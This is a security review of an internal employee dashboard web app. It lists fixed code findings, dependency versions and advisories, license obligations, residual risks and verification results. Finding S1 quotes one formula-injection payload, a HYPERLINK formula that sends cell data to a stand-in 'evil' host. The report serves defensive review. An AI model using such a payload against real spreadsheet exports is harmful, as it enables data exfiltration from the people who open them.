# Security review: Cyber Security Employee Dashboard

| | |
|---|---|
| Date | 2026-10-06 |
| Scope | Every file in the project: Python server (`app.py`, `core/`, `scripts/`, `launcher.py`), browser code (`static/`, `admin_ui/`), Windows launcher (`windows/StartDashboard.cs`), dependencies and licenses |
| Method | Manual code review (SAST), manual dependency and advisory review (SCA), SBOM generated from installed package metadata, manual license review. At the owner's request no scanners were installed. A Bandit run and an OSV lookup made earlier in the session, before scanners were removed, agree with the findings below. |
| Result | 13 findings fixed and verified. Residual risks R1 and R3–R8 are documented below as deployment and policy decisions; R2 (third-party fonts) has since been resolved. No known-vulnerable dependency versions remain. No copyleft licenses. |

## 1. SAST findings

| ID | Severity | Finding | Status |
|---|---|---|---|
| S1 | Medium | **Spreadsheet formula injection (CWE-1236).** The exports (leaderboard, unmapped emails, upload log) wrote uploaded names and file names with openpyxl, which stores any string starting with `=` as a live formula. A name such as `=HYPERLINK("http://evil/?"&A1,"Click")` in the HR mapping file would run in the admin's Excel. | Fixed: `excel_io._neutralise_formulas` writes cells starting with `= + - @ TAB CR` as text with Excel's quote prefix. |
| S2 | Medium | **Unauthenticated large-body DoS (CWE-770).** Waitress buffers request bodies up to 1 GB (its default) to disk/memory before Flask's 25 MB limit runs, on any URL, public ones included. | Fixed: `max_request_body_size` = `MAX_UPLOAD_MB` + 1 MB. |
| S3 | Medium | **Spoofable client IP in the audit log (CWE-348).** With `TRUST_PROXY=1` the code used the left-most `X-Forwarded-For` value, which the client controls. | Fixed: Werkzeug `ProxyFix(x_for=1, x_proto=1)` trusts exactly one hop (the value the proxy appended). |
| S4 | Medium (design) | **Admin access is a bearer URL only (CWE-306/598/319).** Anyone holding the URL is admin; on plain-HTTP network deployments the URL travels unencrypted. | Mitigated: optional `ADMIN_PASSWORD` second factor with constant-time comparison and a lockout after 10 failures per address (15 min). The startup banner warns when serving the network over HTTP. HSTS is sent behind an HTTPS proxy. Remaining exposure depends on deployment (R8). |
| S5 | Low | **Admin secret written to logs (CWE-532).** Unhandled-error logging included the request path, and the startup banner printed the full admin URL even when output was redirected to a service log. | Fixed: secret redacted from logged paths. The full URL prints only to an interactive console (`SHOW_ADMIN_URL=1` to override). |
| S6 | Low | **Directory enumeration via public search (CWE-200).** Search matched email substrings (`?q=example.com` listed everyone; `?q=ceo` probed addresses). | Fixed: search matches names, or one exact full email address only. |
| S7 | Low | **Decompression bomb in `.xlsx` parsing (CWE-409).** A 150 KB upload could expand to gigabytes in openpyxl. Admin-only, but it can take the server down. | Fixed: the zip directory is checked first (max 100 MB unpacked, 5,000 members). `zipfile` never inflates a member past its declared size, so the cap holds. |
| S8 | Low | **XML hardening silently optional (CWE-611/776).** openpyxl only uses defusedxml when it's installed, and falls back to the unhardened parser otherwise. | Fixed: the app refuses to start without defusedxml. |
| S9 | Low | **Demo mode reused the production admin secret** from `.env`. | Fixed: the demo keeps its own key in `demo-data/`. |
| S10 | Low | **Missing headers / server disclosure (CWE-693/200).** No `Permissions-Policy`, COOP, CORP or HSTS, and `Server: waitress` was sent. | Fixed: headers added (HSTS only over HTTPS), `Server` header removed. |
| S11 | Low | **Unmaintained legacy binary parser.** `.xls` uploads were parsed with xlrd (maintenance-only, binary OLE format). | Fixed: removed (see L1). `.xls` uploads get a "save as .xlsx" message. |
| S12 | Info | **Settings not range-checked** (`PORT`, `MAX_UPLOAD_MB`), and no password length rule. | Fixed: validated at startup with clear messages. |
| S13 | Info | **Defense in depth.** Two HTML templates interpolated server-side constants (category label/code) without escaping. Not exploitable (the values aren't user-controlled). | Fixed: escaped anyway. |

**Reviewed with no issue found:**
* **XSS:** every server string reaches `innerHTML` through `esc()`. The CSP allows only `script-src 'self'`, with no inline scripts and no `eval`.
* **Path traversal:** `send_from_directory`/`safe_join`, and archive names are sanitised and prefixed with the version ID.
* **CSRF:** not applicable (no cookies or sessions; every admin request needs the secret path).
* **Clickjacking:** `X-Frame-Options: DENY` plus `frame-ancestors 'none'`.
* **Injection:** no SQL, shell or template rendering of user input.
* **Uploads:** formulas aren't evaluated (`data_only`) and macros never run.
* **Secrets:** generated with `secrets.token_urlsafe` (288 bits).
* **Errors and data exposure:** errors are generic. The public API never returns full email addresses (salted-hash IDs, masked hints). `.env` is not reachable over HTTP.
* **Launchers:** `StartDashboard.exe` installs Python only after an explicit `Y` and only through winget, which verifies installer hashes. It runs without elevation (asInvoker).

## 2. SCA (third-party dependencies)

| Package | Version | License | Kind | Known advisories at this version |
|---|---|---|---|---|
| Flask | 3.1.3 | BSD-3-Clause | direct | none (CVE-2025-47278 fixed in 3.1.1) |
| Werkzeug | 3.1.9 | BSD-3-Clause | transitive | none (CVE-2024-34069, CVE-2024-49766/49767, CVE-2025-66221 all fixed earlier) |
| Jinja2 | 3.1.6 | BSD-3-Clause | transitive | none (CVE-2024-56201/56326 and CVE-2025-27516 fixed) |
| MarkupSafe | 3.0.4 | BSD-3-Clause | transitive | none |
| itsdangerous | 2.2.0 | BSD-3-Clause | transitive | none |
| click | 8.5.0 | BSD-3-Clause | transitive | none |
| blinker | 1.9.0 | MIT | transitive | none |
| openpyxl | 3.1.5 | MIT | direct | none |
| et-xmlfile | 2.0.0 | MIT | transitive | none |
| defusedxml | 0.7.1 | PSF-2.0 | direct | none |
| waitress | 3.0.2 | ZPL-2.1 | direct | none (CVE-2024-49768/49769 fixed in 3.0.1) |

Fixes made:
* **Pinned dependencies.** `requirements.txt` used `>=` ranges, so builds weren't reproducible and future releases would be pulled unreviewed. All 11 runtime packages, direct and transitive, are now pinned to the exact reviewed versions.
* **Outdated pip.** pip in `.venv` was 25.3, which has published advisories (fixed in 26.x). It is now 26.2.1, and `launcher.py` updates pip on every online install.
* **xlrd removed.** One fewer dependency (see S11 and L1).
* **Front end.** No third-party JavaScript, and no third-party requests at all: the three web fonts are now bundled in `static/fonts` (see R2).

**SBOM:** [`security/sbom.cdx.json`](security/sbom.cdx.json) (CycloneDX 1.5, with components, licenses, purls and the dependency graph; the 16 bundled font files are listed with SHA-256 hashes). Regenerate after any version change with `.venv\Scripts\python scripts\sbom.py`.

## 3. License review

All licenses are permissive (MIT, BSD-3-Clause, PSF-2.0, ZPL-2.1; bundled fonts OFL-1.1). There is no GPL/LGPL/AGPL, so internal and proprietary use is unrestricted.

| ID | Finding | Status |
|---|---|---|
| L1 | **xlrd** contained code under a BSD-4-Clause-style license, with an advertising clause and a mandatory acknowledgment ("This product includes software developed by David Giffin") in every redistribution. | Fixed: dependency removed. |
| L2 | **Attribution obligations.** BSD/MIT/PSF/ZPL require the copyright and license text to accompany any redistribution (for example, copying `.venv` or the `wheels\` bundle to another server). | Fixed: [`security/THIRD_PARTY_NOTICES.md`](security/THIRD_PARTY_NOTICES.md) contains all 16 license texts (13 package texts, 3 font OFL texts). ZPL-2.1 also forbids using the Zope trademarks, which this project doesn't do. |
| L3 | **The project's own code has no LICENSE file.** | Owner decision: add an internal/proprietary notice if the code will be shared outside the team. |
| L4 | **Fonts.** Orbitron, Rajdhani and JetBrains Mono are OFL-1.1 and now redistributed with the project. The OFL requires its text to travel with the fonts and forbids selling them on their own. | Done: unmodified WOFF2 files with `OFL-*.txt` next to them in `static/fonts`; the texts are repeated in the notices. |

## 4. Residual risks and recommendations

| ID | Risk | Recommendation |
|---|---|---|
| R1 | CSP allows `style-src 'unsafe-inline'` (needed for inline style attributes). Scripts stay strict. | Accept (low). |
| R2 | ~~Google Fonts sends each visitor's IP to Google (privacy/GDPR) and is an external availability dependency.~~ | **Resolved:** fonts self-hosted in `static/fonts`. The CSP now allows only `'self'` for fonts and styles, and pages make no third-party requests. |
| R3 | No rate limiting on the public API. An in-app per-IP limit would throttle everyone sharing one proxy IP. | Rate-limit at the reverse proxy (IIS Dynamic IP Restrictions, nginx `limit_req`). |
| R4 | `data/` holds names and emails unencrypted. Original uploads and backups are kept indefinitely (that's how history is preserved). | Restrict the folder's NTFS permissions, use BitLocker, apply a retention policy to `data/uploads` and `data/backups`. |
| R5 | `StartDashboard.exe` is unsigned, so SmartScreen warns when it arrives from the internet. | Sign it with the company code-signing certificate. |
| R6 | Packages are pinned by version, not by hash. | For stricter supply-chain control, build the offline `wheels\` bundle on a vetted machine (`launcher.py --download-wheels`), or add hashes in CI. |
| R7 | `data/audit.log` grows without limit. | Archive it periodically. |
| R8 | One shared admin URL/password, with no per-person identity. Security depends on HTTPS. | Production: HTTPS reverse proxy, `ADMIN_PASSWORD`, `TRUST_PROXY=1`; ideally Windows Authentication/SSO in front of `/ops/` for named accountability. |

## 5. Verification

These checks were run against isolated scratch data. All passed.

* **Formula injection:** a `=HYPERLINK(...)` name in the mapping exports as text with a quote prefix; `+…` and `@…` are neutralised; normal text is untouched.
* **Search:** email substrings (`victim`, `example.com`) return 0 matches; an exact email returns 1; name search still works.
* **Zip bomb:** a 149 KB file that would unpack to 150 MB is rejected before inflating.
* **Headers:** the new headers are present, HSTS is absent over HTTP and present when the proxy reports HTTPS, and the `Server` header is gone.
* **Admin password:** 401 without it, 200 with it, 401 for 10 wrong attempts, then 429 lockout. The wrong URL still returns 404, and the public site is unaffected.
* **Proxy:** the audit records the proxy-appended IP and ignores the client-forged one. Without `TRUST_PROXY`, `X-Forwarded-For` is ignored.
* **Request size:** waitress body limit set. `.env` is not reachable over HTTP. Invalid `PORT` and short passwords are refused.
* **Functional regression:** 31 uploads, history, ranking and breakdown sums all correct; `.xls` is rejected with guidance; exports and pages load; the demo uses its own secret.
* **Launchers:** on a fresh copy, `launcher.py` built the venv, installed exactly the pinned versions and generated a unique `.env` secret. `StartDashboard.exe` found Python, skipped the already-done install and served the app.
